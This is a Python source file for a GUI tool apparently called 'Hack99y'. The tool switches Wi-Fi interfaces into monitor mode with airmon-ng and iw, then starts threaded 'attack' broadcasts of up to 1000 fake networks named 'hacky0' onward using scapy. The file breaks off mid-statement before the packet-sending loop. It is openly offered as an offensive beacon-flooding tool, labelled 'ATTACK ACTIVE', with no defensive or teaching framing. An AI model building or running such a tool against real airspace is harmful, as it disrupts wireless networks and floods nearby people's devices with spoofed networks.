import customtkinter as ctk
import os
import threading
import time
import psutil
from scapy.all import *

# إعدادات الواجهة
ctk.set_appearance_mode("Dark")
ctk.set_default_color_theme("green")

class Hack99y(ctk.CTk):
    def __init__(self):
        super().__init__()

        self.title("Hack99y - Control Panel")
        self.geometry("850x700")

        self.is_running = False
        self.sent_packets = 0
        self.interfaces = ["wlan0", "wlan1"]

        # شعار ASCII
        self.ascii_label = ctk.CTkLabel(self, text="""
   _  _    _    ____ _  _______  ___  _   _ 
  | || |  / \  / ___| |/ / ___||_ _|| | | |
  | || |_/ _ \| |   | ' /|___ \ | | | |_| |
  |__   _/ ___ \ |___| . \ ___) || |  \__, |
     |_|/_/   \_\____|_|\_\____/|___|  |_|  
        """, font=("Courier", 12), text_color="#00FF00")
        self.ascii_label.pack(pady=10)

        # --- لوحة التحكم في الأوضاع (Modes) ---
        self.mode_frame = ctk.CTkFrame(self)
        self.mode_frame.pack(pady=10, padx=20, fill="x")

        self.mon_btn = ctk.CTkButton(self.mode_frame, text="Monitor Mode", fg_color="#2980b9", command=self.set_monitor)
        self.mon_btn.pack(side="left", padx=20, pady=15, expand=True)

        self.man_btn = ctk.CTkButton(self.mode_frame, text="Managed Mode", fg_color="#8e44ad", command=self.set_managed)
        self.man_btn.pack(side="left", padx=20, pady=15, expand=True)

        # --- التحكم في عدد الشبكات ---
        self.config_frame = ctk.CTkFrame(self)
        self.config_frame.pack(pady=10, padx=20, fill="x")

        self.slider_label = ctk.CTkLabel(self.config_frame, text="Broadcast Range: hacky0 to hacky500", font=("Arial", 14))
        self.slider_label.pack(pady=5)

        self.range_slider = ctk.CTkSlider(self.config_frame, from_=1, to=1000, number_of_steps=1000, command=self.update_range_label)
        self.range_slider.pack(padx=20, pady=10, fill="x")
        self.range_slider.set(500)

        # --- أزرار التشغيل والإيقاف ---
        self.action_frame = ctk.CTkFrame(self, fg_color="transparent")
        self.action_frame.pack(pady=10, padx=20, fill="x")

        self.start_btn = ctk.CTkButton(self.action_frame, text="START BROADCAST", fg_color="#27ae60", height=45, command=self.start_attack)
        self.start_btn.pack(side="left", padx=10, expand=True, fill="x")

        self.stop_btn = ctk.CTkButton(self.action_frame, text="STOP BROADCAST", fg_color="#c0392b", height=45, command=self.stop_attack)
        self.stop_btn.pack(side="left", padx=10, expand=True, fill="x")

        # --- الإحصائيات ---
        self.log_box = ctk.CTkTextbox(self, height=200, fg_color="black", text_color="#00FF00")
        self.log_box.pack(pady=10, padx=20, fill="both")

        self.status_label = ctk.CTkLabel(self, text="System Idle | Packets: 0", text_color="yellow")
        self.status_label.pack(pady=5)

    def log(self, msg):
        self.log_box.insert("end", f"[*] {msg}\n")
        self.log_box.see("end")

    def update_range_label(self, value):
        self.slider_label.configure(text=f"Broadcast Range: hacky0 to hacky{int(value)-1}")

    def set_monitor(self):
        self.log("Switching interfaces to Monitor Mode...")
        os.system("sudo airmon-ng check kill")
        for iface in self.interfaces:
            os.system(f"sudo ip link set {iface} down")
            os.system(f"sudo iw dev {iface} set type monitor")
            os.system(f"sudo ip link set {iface} up")
            self.log(f"{iface} -> Monitor Mode [OK]")

    def set_managed(self):
        self.log("Switching interfaces to Managed Mode (Reset)...")
        for iface in self.interfaces:
            os.system(f"sudo ip link set {iface} down")
            os.system(f"sudo iw dev {iface} set type managed")
            os.system(f"sudo ip link set {iface} up")
            self.log(f"{iface} -> Managed Mode [OK]")
        os.system("sudo systemctl restart NetworkManager")

    def start_attack(self):
        if not self.is_running:
            self.is_running = True
            self.log(f"Starting broadcast for {int(self.range_slider.get())} networks...")
            for iface in self.interfaces:
                threading.Thread(target=self.broadcast_logic, args=(iface,), daemon=True).start()
            threading.Thread(target=self.update_counter, daemon=True).start()

    def stop_attack(self):
        self.is_running = False
        self.log("Broadcast Stopped.")

    def update_counter(self):
        while self.is_running:
            self.status_label.configure(text=f"ATTACK ACTIVE | Packets Sent: {self.sent_packets}")
            time.sleep(0.5)

    def broadcast_logic(self, iface):
        limit = int(self.range_slider.get())
        ssids = [f"hacky{i}" for i in range(limit)]
        while
